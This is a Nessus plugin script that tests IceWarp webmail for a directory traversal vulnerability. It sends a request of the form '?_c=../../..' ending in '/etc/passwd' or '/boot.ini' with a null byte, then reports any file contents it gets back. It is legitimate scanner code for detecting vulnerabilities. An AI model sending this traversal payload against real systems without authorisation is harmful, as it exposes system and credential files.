#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(51098);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2015/09/24 21:08:40 $");

  script_bugtraq_id(45222);
  script_osvdb_id(69689);
  script_xref(name:"Secunia", value:"42389");

  script_name(english:"IceWarp webmail/basic/index.html _c Parameter Directory Traversal");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a script that is prone to a directory
traversal attack.");

  script_set_attribute(attribute:"description", value:
"The version of IceWarp installed on the remote host is affected by
a directory traversal vulnerability because the application fails to
properly sanitize user-supplied input to the '_c' parameter of the
'/webmail/basic/index.html' script.

An attacker could leverage this issue to read arbitrary file on the
remote host, subject to the privileges of the web server user id.

Note that this version of IceWarp is likely to be affected by multiple
cross-site scripting vulnerabilities, though Nessus has not tested for
them.");

  script_set_attribute(attribute:"see_also", value:"http://www.icewarp.com/company/news/#40");
  script_set_attribute(attribute:"solution", value:"Upgrade to IceWarp 10.2.1 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/12/07");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/12/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/12/09");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:icewarp:webmail");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("icewarp_webmail_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/icewarp_webmail");
  script_require_ports("Services/www", 32000, 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:32000);

install = get_install_from_kb(appname:'icewarp_webmail', port:port, exit_on_fail:TRUE);

# Try to determine the host OS
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');


file_pats = make_array();
file_pats['/etc/passwd'] = 'root:.*:0:[01]:';
file_pats['/boot.ini'] = '^ *\\[boot loader\\]';

dir = install['dir'];

foreach file (files)
{
  url = dir +'/basic/index.html?_c=';
  url = url + '../../../../../../../../../../../../' + file + '%00';

  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    if (report_verbosity > 0)
    {
      if (os && 'Windows' >< os) file = str_replace('/', replace:'\\', string:file);

      report =
        '\nNessus was able to exploit the issue to retrieve the contents of ' +
        '\n\'' + file + '\' on the remote host by requesting the following URL :' +
        '\n' +
        '\n' +
        '  ' + build_url(port:port, qs:url) + '\n';

      if (report_verbosity > 1)
      {
        report +=
          '\nHere\'s the contents of the file : ' + '\n\n' +
          crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) + '\n' +
          res[2] + '\n' +
          crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) + '\n';
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
exit(0, 'The IceWarp install on port '+port+' is not affected.');
